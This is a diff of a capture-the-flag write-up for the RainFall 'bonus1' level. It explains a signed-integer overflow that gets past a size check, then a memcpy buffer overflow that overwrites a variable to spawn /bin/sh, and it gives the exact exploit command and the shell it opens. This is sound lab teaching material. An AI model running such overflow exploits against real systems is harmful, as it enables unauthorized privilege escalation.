@@ -47,14 +47,25 @@ bonus1@RainFall:/tmp$ ./check
 44
 ```
 
+To execute `/bin/sh`, res should be equal to `0x574f4c46`.
+```c
+if (res == 0x574f4c46) {
+    execl("/bin/sh", "sh", NULL);
+}
+```
 
-https://www.rapidtables.com/convert/number/binary-to-decimal.html
+To do that, let's use unprotected `memcpy`, that overflows the buffer of 40 bytes and overwrites `res` value.
 
-https://www.calculator.net/binary-calculator.html
+So, to hack this level we need to pass the number that will be equal to 44 if left shift of 2 will be applied to it. <br>
+`11` is `1011` in binary form or `00000000 00000000 00000000 00001011` in 4 byte form. But the most signinficant bit represents the sign in signed numbers. <br>
+We cannot pass `11` because there is a number validation that accepts only numbers <= 9. <br>
+But we can pass its negative equivalent `10000000 00000000 00000000 00001011` as the signed bit will be erased by bit shifting operation.
 
-./bonus1 "-2147483637" $(python -c 'print "\x57\x4f\x4c\x46"[::-1] * 11')
+And `10000000 00000000 00000000 00001011` is `-2147483637`
 
+Now, it's time to exploit:
 ```bash
+bonus1@RainFall:~$ ./bonus1 "-2147483637" $(python -c 'print "\x57\x4f\x4c\x46"[::-1] * 11')
 $ whoami
 bonus2
 $ id
@@ -76,5 +87,6 @@ $ cat .pass
 ```
 
 ## References
-
-https://stackoverflow.com/questions/37239885/what-is-leal-edx-edx-4-eax-means
+- [about 0x0(,%eax,4),%ecx](https://stackoverflow.com/questions/37239885/what-is-leal-edx-edx-4-eax-means)
+- [binary convertation](https://www.rapidtables.com/convert/number/binary-to-decimal.html)
+- [binary calculator](https://www.calculator.net/binary-calculator.html)
